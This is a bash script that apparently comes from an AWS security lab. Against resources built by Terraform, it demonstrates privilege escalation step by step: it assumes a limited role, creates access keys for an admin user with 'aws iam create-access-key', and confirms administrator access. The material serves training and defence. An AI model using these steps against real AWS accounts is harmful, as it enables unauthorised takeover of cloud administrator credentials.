#!/bin/bash

# Demo script for iam:CreateAccessKey privilege escalation
# This script demonstrates how a role with CreateAccessKey permission can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-one-hop-cak-starting-user"
PRIVESC_ROLE="pl-prod-one-hop-cak-role"
ADMIN_USER="pl-prod-one-hop-cak-admin"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM CreateAccessKey Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_createaccesskey.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Step 2: Verify identity
echo -e "${YELLOW}Step 2: Verifying identity${NC}"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Assume the privilege escalation role
echo -e "${YELLOW}Step 4: Assuming role $PRIVESC_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
echo "Role ARN: $ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-attack-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

# Verify we're now the role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed role${NC}\n"

# Step 5: Check current permissions (should be limited)
echo -e "${YELLOW}Step 5: Testing current permissions${NC}"
echo "Attempting to list S3 buckets (should fail)..."
if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
else
    echo -e "${YELLOW}Warning: Unexpected permissions${NC}"
fi
echo ""

# Step 6: Create access keys for the admin user
echo -e "${YELLOW}Step 6: Creating access keys for admin user $ADMIN_USER${NC}"
echo "This is the privilege escalation vector..."

NEW_ACCESS_KEY=$(aws iam create-access-key \
    --user-name $ADMIN_USER \
    --output json)

NEW_ACCESS_KEY_ID=$(echo $NEW_ACCESS_KEY | jq -r '.AccessKey.AccessKeyId')
NEW_SECRET_ACCESS_KEY=$(echo $NEW_ACCESS_KEY | jq -r '.AccessKey.SecretAccessKey')

echo "Created new access key: $NEW_ACCESS_KEY_ID"
echo -e "${GREEN}✓ Successfully created access keys for admin user${NC}\n"

# Sleep 
echo -e "${GREEN}✓ Sleeping for 15 seconds to let the keys initialize${NC}\n"
sleep 15

# Step 7: Switch to new admin credentials
echo -e "${YELLOW}Step 7: Switching to new admin credentials via environment variables${NC}"
# Unset the session token from the assumed role
unset AWS_SESSION_TOKEN

# Export the new admin credentials
export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_ACCESS_KEY
echo -e "${GREEN}✓ Switched to admin user credentials${NC}\n"

# Step 8: Verify admin access
echo -e "${YELLOW}Step 8: Verifying administrator access with new credentials${NC}"
ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"

# Test admin permissions
echo "Testing admin permissions (listing IAM users)..."
IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head -5)
echo "Successfully listed IAM users: $IAM_USERS"
echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$PRIVESC_ROLE${NC}"
echo -e "Step 2: Created access keys for ${YELLOW}$ADMIN_USER${NC}"
echo -e "Step 3: Gained ${GREEN}Administrator Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $PRIVESC_ROLE → (CreateAccessKey) → $ADMIN_USER → Admin"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the created access keys${NC}"
echo -e "${RED}Access Key ID to delete: $NEW_ACCESS_KEY_ID${NC}"
echo ""

# Cleanup instructions
echo -e "${YELLOW}To clean up:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

